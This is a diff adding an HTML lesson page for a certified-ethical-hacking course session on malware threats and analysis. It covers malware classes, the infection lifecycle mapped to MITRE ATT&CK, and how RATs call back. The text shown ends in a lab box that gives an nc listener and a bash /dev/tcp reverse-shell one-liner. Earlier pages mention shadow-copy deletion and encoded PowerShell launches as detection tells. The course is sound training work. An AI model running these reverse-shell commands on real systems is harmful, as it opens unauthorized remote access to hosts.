@@ -1,0 +1,1076 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Session 07 — Malware Threats &amp; Analysis | CEH · ITGate Academy</title>
+<meta name="description" content="CEH Diploma Session 7 — Malware Threats \&amp; Analysis: how malware propagates, trojans and RATs, viruses and worms, ransomware and fileless malware, then the analyst side — static and dynamic analysis in a safe sandbox (strings, VirusTotal, PE imports, ProcMon, TCPView), every behaviour mapped to MITRE ATT\&amp;CK and carried to its SOC detection flip, ending in a YARA rule and an incident triage report.">
+<link rel="stylesheet" href="../assets/css/ceh.css">
+<link rel="icon" href="../assets/img/itgate-logo.jpg">
+</head>
+<body data-session="s07">
+
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="../index.html">
+      <img src="../assets/img/itgate-logo.jpg" alt="ITGate Academy">
+      <span class="brand-text">
+        <span class="brand-name">ITGate Academy</span>
+        <span class="brand-sub">CEH · Session 07</span>
+      </span>
+    </a>
+    <nav class="topnav">
+      <a href="../index.html">All sessions</a>
+      <a href="../index.html#lab">Lab</a>
+      <a href="../index.html#resources">Resources</a>
+    </nav>
+  </div>
+</header>
+
+<div class="progress-wrap"><div class="wrap progress-inner" id="progressHost"></div></div>
+
+<div class="wrap section">
+<div class="page-layout">
+
+  <aside class="sidebar">
+    <h5>Session 07 · Pages</h5>
+    <ol id="sessionNav"></ol>
+    <div class="side-cta">
+      <h5>Deliverable</h5>
+      <a href="report.html">📋 Open Team Report</a>
+    </div>
+  </aside>
+
+  <article>
+
+  <svg aria-hidden="true" focusable="false" width="0" height="0" style="position:absolute">
+    <defs>
+      <marker id="ar-o" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#ff7043"/></marker>
+      <marker id="ar-c" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#22d3ee"/></marker>
+      <marker id="ar-g" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#768290"/></marker>
+      <marker id="ar-r" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#e63946"/></marker>
+      <marker id="ar-grn" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#4ade80"/></marker>
+      <marker id="ar-am" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#fbbf24"/></marker>
+      <marker id="ar-pu" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#a78bfa"/></marker>
+    </defs>
+  </svg>
+
+  <section class="page" data-title="Cover">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07</span><span class="tag cover"></span></div>
+      <h1>Session 7 &mdash; Malware Threats &amp; Analysis</h1>
+      <p class="lede">You have written payloads and stolen credentials. Now meet the artifact itself &mdash; and learn to take it apart the way a SOC analyst does.</p>
+    </div>
+    <div class="content">
+<div class="cover-hero">
+      <p>In Session 5 you turned an exploit into a shell with <span class="mono">msfvenom</span>. In Session 6 you walked that shell up to
+      SYSTEM. Every one of those payloads is <strong class="hl">malware</strong> &mdash; and on the other side of the fence, an analyst has
+      to catch it, name it, and prove what it did.</p>
+      <p>This session is both chairs at once. You will build a controlled lab trojan, then <strong>reverse the roles</strong>: hash it,
+      strings it, detonate it in a sandbox, watch its calls home, map every behaviour to <span class="mono">MITRE ATT&amp;CK</span>, and
+      finish by writing the <strong class="hl hl-d">YARA and Sigma rules that would have caught it</strong>. Attack informs defence &mdash;
+      that is the whole point of learning malware.</p>
+      <div class="cover-meta">
+        <span>&#9201; ~3.5 hours</span><span>&#9670; 9 mini-labs + 5 build labs</span><span>&#128273; Deliverable: an incident triage report</span>
+      </div>
+    </div><div class="box intro"><span class="box-t">How this session runs</span><p>Every theory page ends with a <strong>&#9654; Prove it</strong> mini-lab &mdash; one or two commands that make the idea real on your own machine. The stepped diagrams <strong>play</strong>: press <em>Play</em> and watch each attack unfold one message at a time. Read nothing passively &mdash; run it, watch it, then read the log it left.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="From foothold to artifact">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P02</span><span class="tag bridge">Recap &middot; where this fits</span><span class="time">&#9201; 4 min</span></div>
+      <h1>From &quot;I Have a Shell&quot; to &quot;What Is This File?&quot;</h1>
+      <p class="lede">Sessions 5&ndash;6 made you the operator. Session 7 makes you the analyst who receives the operator&#39;s artifact and has to explain it.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The thread so far</span><p>You have been the attacker for three sessions: enumerate (S3&ndash;4), exploit (S5), escalate (S6). Each step left a file or a process on disk &mdash; a payload, a dumped hash, a persistence binary. To the blue team, all of those are <strong>malware samples</strong> that landed on an endpoint and need triage. Today you learn the discipline that turns &quot;something suspicious ran&quot; into a named, mapped, reportable incident.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 316" role="img" aria-label="The bridge: an attacker's payload from Session 5 becomes the malware sample a SOC analyst triages in Session 7.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER (S5&ndash;S6)</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">built the payload</text>
+          <line x1="185" y1="80" x2="185" y2="294" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">ENDPOINT</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">where it ran</text>
+          <line x1="520" y1="80" x2="520" y2="294" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--green)">SOC ANALYST (S7)</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">triages the artifact</text>
+          <line x1="890" y1="80" x2="890" y2="294" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="352" y="106" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">deliver &amp; run payload</text>
+          <path d="M191,120 L514,120" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <rect x="245" y="152" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--orange)"/>
+          <text x="470" y="172" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--orange)">EDR quarantines a suspicious file &rarr; ticket to the SOC</text>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--green)">pull the sample, isolate host</text>
+          <path d="M884,228 L526,228" fill="none" stroke="var(--green)" stroke-width="2" marker-end="url(#ar-grn)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <rect x="245" y="260" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="280" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">STATIC &rarr; DYNAMIC &rarr; ATT&amp;CK &rarr; detection rule</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The msfvenom shell / persistence binary from S5&ndash;S6 lands and executes on the host.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>The endpoint agent flags an unknown executable. Now it is a sample, not an exploit.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>The analyst grabs the file and network-isolates the endpoint before touching it.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>The exact workflow of this session: examine without running, then run in a sandbox, then map and detect.</div>
+        </figure>
+      <div class="box key-takeaway"><span class="box-t">The reframe</span><p><strong class="hl">Your payload is someone else&#39;s incident.</strong> Learning to analyse malware makes you a better attacker (you see what gets caught) <em>and</em> a better defender (you catch it). Today you sit in both chairs on the same file.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Why malware matters">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P03</span><span class="tag theory">Why &middot; impact</span><span class="time">&#9201; 5 min</span></div>
+      <h1>Why Malware Is the Center of Gravity</h1>
+      <p class="lede">Almost every breach you will ever investigate has malware somewhere in its chain. Here is why this is the highest-leverage skill in the room.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The scale problem</span><p>Malware is not a niche. It is the delivery mechanism for ransomware, the persistence for espionage, and the payload for almost every commodity intrusion. AV vendors see <strong>hundreds of thousands of new samples every day</strong> &mdash; far too many for humans to reverse one by one, which is exactly why automated static/dynamic triage and signatures (YARA, Sigma) exist.</p></div>      <div class="stat-row">
+        <div class="stat"><span class="stat-n">~560K</span><span class="stat-l">new malware samples seen <em>per day</em> by AV telemetry &mdash; the reason triage is automated</span></div>
+        <div class="stat"><span class="stat-n">Ransomware</span><span class="stat-l">the most costly malware class &mdash; encrypt, extort, leak; a single family can hit thousands of orgs</span></div>
+        <div class="stat"><span class="stat-n">Fileless</span><span class="stat-l">a large share of modern intrusions never drop an .exe &mdash; they live in PowerShell, WMI, and the registry</span></div>
+      </div><div class="box case"><span class="box-t">Real-world anchor &mdash; WannaCry (2017)</span><p>A worm (self-propagating, no user click) carrying a ransomware payload, spreading over the same <strong>MS17-010 / EternalBlue</strong> flaw you exploited in Session 5. It hit ~200,000 machines across 150 countries in days &mdash; hospitals, telecoms, logistics. One malware sample, every concept in this session: worm propagation, a ransomware payload, a killable C2 domain, and IOCs the whole industry raced to write. You already know how its front door worked.</p></div><div class="box key-takeaway"><span class="box-t">Why you specifically</span><p><strong class="hl">You are the person who receives the file.</strong> When an endpoint flags something, someone has to say <em>what it is, what it did, and how to catch the next one.</em> That someone is a SOC analyst who can read a binary &mdash; the skill this session builds.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Malware taxonomy">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P04</span><span class="tag theory">Method &middot; the map</span><span class="time">&#9201; 8 min</span></div>
+      <h1>The Malware Family Tree</h1>
+      <p class="lede">Seven classes cover almost everything you will triage. Learn what separates them &mdash; propagation, purpose, and how they hide.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Classify by behaviour, not by name</span><p>Vendors give malware colourful names, but for triage you classify by <strong>how it spreads</strong> and <strong>what it is for</strong>. Those two axes tell you what to look for. Click each class for its defining behaviour and the tell that gives it away.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 250" role="img" aria-label="The malware family tree: trojan, RAT, virus, worm, ransomware, fileless, and rootkit. Click each class.">
+          <rect x="370" y="12" width="200" height="38" rx="9" fill="#1f2533" stroke="#e63946"/><text class="d-title" x="470" y="37" text-anchor="middle" font-size="14">MALWARE</text>
+          <g class="node" data-node="tro" tabindex="0"><rect x="20" y="80" width="205" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="122" y="102" text-anchor="middle" font-size="12.5">Trojan</text><text class="d-sub" x="122" y="120" text-anchor="middle">disguised as legit</text></g>
+          <g class="node" data-node="rat" tabindex="0"><rect x="245" y="80" width="205" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="347" y="102" text-anchor="middle" font-size="12.5">RAT / backdoor</text><text class="d-sub" x="347" y="120" text-anchor="middle">remote control + C2</text></g>
+          <g class="node" data-node="vir" tabindex="0"><rect x="490" y="80" width="205" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="592" y="102" text-anchor="middle" font-size="12.5">Virus</text><text class="d-sub" x="592" y="120" text-anchor="middle">attaches; needs a click</text></g>
+          <g class="node" data-node="wor" tabindex="0"><rect x="715" y="80" width="205" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="817" y="102" text-anchor="middle" font-size="12.5">Worm</text><text class="d-sub" x="817" y="120" text-anchor="middle">self-spreads, no click</text></g>
+          <g class="node" data-node="ran" tabindex="0"><rect x="20" y="146" width="205" height="52" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="122" y="168" text-anchor="middle" font-size="12.5">Ransomware</text><text class="d-sub" x="122" y="186" text-anchor="middle">encrypt &rarr; extort</text></g>
+          <g class="node" data-node="fil" tabindex="0"><rect x="245" y="146" width="205" height="52" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="347" y="168" text-anchor="middle" font-size="12.5">Fileless / LOLbins</text><text class="d-sub" x="347" y="186" text-anchor="middle">lives in memory</text></g>
+          <g class="node" data-node="roo" tabindex="0"><rect x="490" y="146" width="205" height="52" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="592" y="168" text-anchor="middle" font-size="12.5">Rootkit</text><text class="d-sub" x="592" y="186" text-anchor="middle">hides other malware</text></g>
+          <g class="node" data-node="adw" tabindex="0"><rect x="715" y="146" width="205" height="52" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="817" y="168" text-anchor="middle" font-size="12.5">Adware / PUP</text><text class="d-sub" x="817" y="186" text-anchor="middle">nuisance + tracking</text></g>
+          <path d="M420,50 L140,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M450,50 L360,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M490,50 L590,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M520,50 L810,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each class &mdash; how it spreads, what it is for, and the tell.</div>
+        <div class="dgm-detail" data-detail="tro"><h5><span class="dd-tag">TROJAN</span>Disguised as something you want</h5><p><b>Looks like a legitimate file &mdash; a cracked game, an invoice, an installer &mdash; but carries a hidden payload.</b> Does not self-replicate; it relies on <em>social engineering</em> to get run. The msfvenom-backdoored executable you will build in Lab A is a trojan. Tell: a benign-looking file that spawns a network connection or a shell.</p></div>
+        <div class="dgm-detail" data-detail="rat"><h5><span class="dd-tag">RAT / BACKDOOR</span>Full remote control</h5><p><b>A Remote Access Trojan gives the attacker a live console on the victim &mdash; files, webcam, keystrokes, shell &mdash; over a C2 channel.</b> njRAT, DarkComet, Meterpreter. Tell: a persistent outbound connection to an odd host/port that survives reboot. This is what your S5 reverse shell <em>is</em>.</p></div>
+        <div class="dgm-detail" data-detail="vir"><h5><span class="dd-tag">VIRUS</span>Attaches and needs a host</h5><p><b>Self-replicating code that inserts itself into other files or programs; it spreads when a user runs the infected host file.</b> Needs human action to propagate. Tell: known-good files whose hash suddenly changed, and an unexpected growth in file size.</p></div>
+        <div class="dgm-detail" data-detail="wor"><h5><span class="dd-tag">WORM</span>Spreads by itself</h5><p><b>Self-propagates across the network with no user interaction</b> &mdash; it finds the next vulnerable host and infects it directly. WannaCry over EternalBlue. Tell: one host suddenly scanning/connecting to hundreds of others on the same port. The scariest class because it does not wait for a click.</p></div>
+        <div class="dgm-detail" data-detail="ran"><h5><span class="dd-tag">RANSOMWARE</span>Encrypt, then extort</h5><p><b>Encrypts the victim&#39;s files and demands payment for the key</b> &mdash; often with a &quot;leak site&quot; double-extortion threat. Tell: mass file rename/rewrite in seconds, a dropped ransom note in every folder, deleted shadow copies (<span class="mono">vssadmin delete shadows</span>).</p></div>
+        <div class="dgm-detail" data-detail="fil"><h5><span class="dd-tag">FILELESS / LOLBins</span>No .exe to find</h5><p><b>Runs entirely in memory using trusted, built-in tools</b> (PowerShell, <span class="mono">wmic</span>, <span class="mono">rundll32</span>, <span class="mono">mshta</span>) &mdash; &quot;living off the land.&quot; Nothing malicious on disk to hash. Tell: a legitimate binary doing illegitimate things &mdash; Word spawning PowerShell with a base64 blob.</p></div>
+        <div class="dgm-detail" data-detail="roo"><h5><span class="dd-tag">ROOTKIT</span>Hides the rest</h5><p><b>Its job is concealment</b> &mdash; it hooks the OS so other malware, processes, and files become invisible to normal tools. Kernel or user-mode. Tell: discrepancies between what the OS reports and what a raw/offline scan sees.</p></div>
+        <div class="dgm-detail" data-detail="adw"><h5><span class="dd-tag">ADWARE / PUP</span>The low end</h5><p><b>Unwanted ads, browser hijacking, and behavioural tracking.</b> Rarely destructive, often bundled with &quot;free&quot; software. Still matters: it is a foothold and a signal of poor hygiene. Tell: new browser extensions, changed search/home page, ad injection.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; classify by behaviour, not by name</span><pre><code># Ask three questions of any sample and you have its class:
+#  1. Does it need a user to click it?   click = virus/trojan   no-click = worm
+#  2. What is it FOR?                     control = RAT   money = ransomware
+#  3. Is there even a file on disk?        no file = fileless / LOLbin</code></pre><p style="margin-top:8px"><b>You should see:</b> you can place almost any real sample into one of the seven boxes with three questions &mdash; and the box tells you what evidence to go looking for.</p></div><div class="box key-takeaway"><span class="box-t">The two axes</span><p><strong class="hl">Propagation &times; purpose.</strong> How it spreads (click / no-click / attaches / self-contained) and what it is for (control / money / theft / concealment). Name it by behaviour and the triage checklist writes itself.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="The malware lifecycle">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P05</span><span class="tag theory">Method &middot; kill chain</span><span class="time">&#9201; 7 min</span></div>
+      <h1>How Malware Lives &mdash; Delivery to Actions</h1>
+      <p class="lede">Every sample, whatever its class, moves through the same stages. Watch the lifecycle play out &mdash; each stage is where a detection lives.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">One lifecycle, many families</span><p>A trojan, a worm, and ransomware differ in <em>how</em> they do each stage, but they share the same skeleton: get in, run, stay, phone home, act. Learning the skeleton means you always know <strong>what stage you are looking at</strong> &mdash; and each stage leaves its own kind of evidence. Press <em>Play</em>.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 424" role="img" aria-label="The malware lifecycle: delivery, execution, persistence, command-and-control, and actions-on-objective, shown as a sequence.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER / C2</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">operator infrastructure</text>
+          <line x1="185" y1="80" x2="185" y2="402" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">VICTIM HOST</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">the endpoint</text>
+          <line x1="520" y1="80" x2="520" y2="402" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--green)">DEFENDER EVIDENCE</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">what each stage leaves</text>
+          <line x1="890" y1="80" x2="890" y2="402" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="352" y="106" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">1 · DELIVERY &mdash; phish / drive-by / USB</text>
+          <path d="M191,120 L514,120" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <rect x="245" y="152" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--orange)"/>
+          <text x="470" y="172" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--orange)">2 · EXECUTION &mdash; user runs it, or an exploit does</text>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <rect x="245" y="206" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--orange)"/>
+          <text x="470" y="226" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--orange)">3 · PERSISTENCE &mdash; survive reboot</text>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="352" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">4 · C2 &mdash; beacon home</text>
+          <path d="M514,282 L191,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">5 · ACTIONS &mdash; steal / encrypt / spread</text>
+          </g>
+          <g class="pf-step" data-step="6" style="--pf-dx:26px">
+          <text x="705" y="376" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--green)">analyst reconstructs the chain</text>
+          <path d="M884,390 L526,390" fill="none" stroke="var(--green)" stroke-width="2" marker-end="url(#ar-grn)"/>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The sample arrives: email attachment, malicious download, removable media, or a worm connecting directly. ATT&amp;CK: Initial Access (TA0001).</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>Code runs: a double-click, a macro, or an exploit like EternalBlue. Evidence: a new process, an odd parent-child (Word&rarr;PowerShell). ATT&amp;CK: Execution (TA0002).</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>It writes a Run key, a scheduled task, or a service so it comes back. Evidence: registry autoruns, new services (Event 7045). ATT&amp;CK: Persistence (TA0003).</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>The implant calls out to its operator for orders. Evidence: repeated outbound connections to an odd host/port, DNS to a young domain. ATT&amp;CK: C2 (TA0011).</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>The goal: exfiltrate data, encrypt for ransom, or propagate. Evidence: mass file access, large uploads, lateral scanning. ATT&amp;CK: Collection / Impact / Lateral Movement.</div>
+        <div class="pf-cap" data-cap="6"><span class="pf-n">STEP 6</span>Triage walks these five stages backward from the alert to tell the full story in the incident report.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; name the stage from the evidence</span><pre><code># Match each observation to a lifecycle stage:
+#  'winword.exe -> powershell.exe -enc ...'        =>  EXECUTION
+#  'HKCU\...\Run  = C:\Users\...\update.exe'         =>  PERSISTENCE
+#  'beacon to 45.66.12.9:443 every 60s'            =>  C2
+#  '3,000 files renamed to .locked in 40s'          =>  ACTIONS (ransomware)</code></pre><p style="margin-top:8px"><b>You should see:</b> the same five-stage skeleton lets you place any single piece of evidence into the story &mdash; which is exactly how you write the incident timeline in Lab E.</p></div><div class="box key-takeaway"><span class="box-t">Detection lives at every stage</span><p><strong class="hl hl-d">You do not need to catch delivery to catch the malware.</strong> Persistence, C2, and actions each leave loud, specific evidence. Miss the email? Catch the Run key, the beacon, or the mass-encryption. Defence in depth = a detection at every stage.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Trojans &amp; RATs">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P06</span><span class="tag theory">Attack &middot; remote control</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Trojans &amp; RATs &mdash; The Attacker&#39;s Live Console</h1>
+      <p class="lede">The class you already built. Watch a RAT connect back and hand the operator a console &mdash; then prove the concept with a listener.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">You have already written one</span><p>Your Session 5 reverse shell is a <strong>RAT</strong> in miniature: a payload that connects back to the attacker and accepts commands. Real RATs (njRAT, DarkComet, Quasar) wrap that in a GUI with file browsing, keylogging, and webcam access &mdash; but the core is the <strong>callback</strong>. Watch how the trojan reverses the connection so it beats the victim&#39;s firewall.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="A reverse-connecting RAT: the victim runs the trojan, which connects out to the attacker's listener, giving the operator a shell.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">VICTIM</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">runs the trojan</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">FIREWALL</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">allows outbound</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER C2</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">waiting listener</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">attacker starts a listener &amp; hands the victim a benign-looking file</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="352" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">victim double-clicks &rarr; outbound TCP 443</text>
+          <path d="M191,174 L514,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">firewall permits it (looks like HTTPS)</text>
+          <path d="M526,228 L884,228" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="537" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">operator gets a shell / full console</text>
+          <path d="M884,282 L191,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">SOC flip: repeated beacon to one odd host = the tell</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>njRAT/msfvenom builds "invoice.exe"; the operator waits on a listener. The trojan is disguised, not self-spreading.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>Crucially the VICTIM initiates the connection outward. Inbound is blocked; outbound 443 looks like normal web traffic.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Egress filtering is the missing control: most firewalls allow outbound 443 to anywhere. This is why reverse shells win.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>The channel is now open both ways. The operator runs commands, browses files, keylogs &mdash; all over the one outbound session.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>A benign process making a steady outbound connection to a rare host/port, surviving reboot, is the RAT signature. Detected on the network and via autoruns.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; watch a reverse callback with a bare listener (no malware needed)</span><pre><code># On your Kali 'attacker' box, start a listener:
+nc -lvnp 4444
+# On the 'victim' (another shell), connect back and hand over a shell:
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
